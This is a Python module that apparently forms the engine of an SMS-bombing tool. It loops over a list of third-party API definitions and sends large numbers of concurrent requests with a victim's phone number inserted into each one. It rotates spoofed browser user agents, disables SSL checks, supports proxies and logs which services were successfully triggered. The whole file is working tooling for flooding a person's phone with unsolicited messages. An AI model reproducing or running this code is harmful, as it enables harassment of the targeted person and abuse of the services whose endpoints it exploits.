import aiohttp
import asyncio
import os
import json
import random
from aiohttp.client_exceptions import ClientProxyConnectionError
from typing import Optional
from utils.bean import APIBean
from utils.log import logger


def tk(beans: [APIBean], phone: str, count: int, proxy: Optional[str] = None):
    async def _():
        task = []
        for idx in range(0, count):
            if len(beans):
                r = idx // len(beans)
                if r:
                    task.append(send(beans[idx - r * len(beans)], phone, proxy))
                else:
                    task.append(send(beans[idx], phone, proxy))
            else:
                logger.error("apidata.json has no data.")
                exit(-1)
        await asyncio.gather(*task)

    if 'nt' == os.name:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.get_event_loop()
    loop.run_until_complete(_())


async def send(bean: APIBean, phone: str, proxy: Optional[str] = None):
    w = wrapper(bean, phone)
    rt = await do(proxy=proxy, **w)
    if bean.identifier in rt:
        logger.success(f'{bean.desc} succeed.')
    else:
        logger.warning(f'{bean.desc} failed.')


async def do(proxy: Optional[str] = None, **kwargs):
    conn = aiohttp.TCPConnector(ssl=False,
                                use_dns_cache=True,
                                ttl_dns_cache=60,
                                limit=None,
                                limit_per_host=0)
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(connector=conn,
                                     timeout=timeout) as session:
        try:
            async with session.request(proxy=proxy, **kwargs) as r:
                if isinstance(r, aiohttp.ClientResponse):
                    rt = await r.text()
                    return rt
        except ConnectionRefusedError:
            logger.info('Connection Refused.')
        except ClientProxyConnectionError:
            logger.info('Proxy Refused.')


def wrapper(bean: APIBean, phone):
    base_headers = {
        'User-Agent': random.choice((
            'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, '
            'like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, '
            'like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
            'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/31.0.1650.59 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36'
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 '
            'Safari/537.36 Edge/12.246 '
        )),
        'Referer': bean.url
    }
    if bean.headers:
        bean.headers.update(base_headers)
    else:
        bean.headers = base_headers
    config = {
        "url": bean.url,
        "method": bean.method.upper(),
        "headers": bean.headers,
        "params": bean.params,
        "data": bean.data,
        "json": bean.json
    }
    return json.loads(json.dumps(config).replace('{phone}', phone))
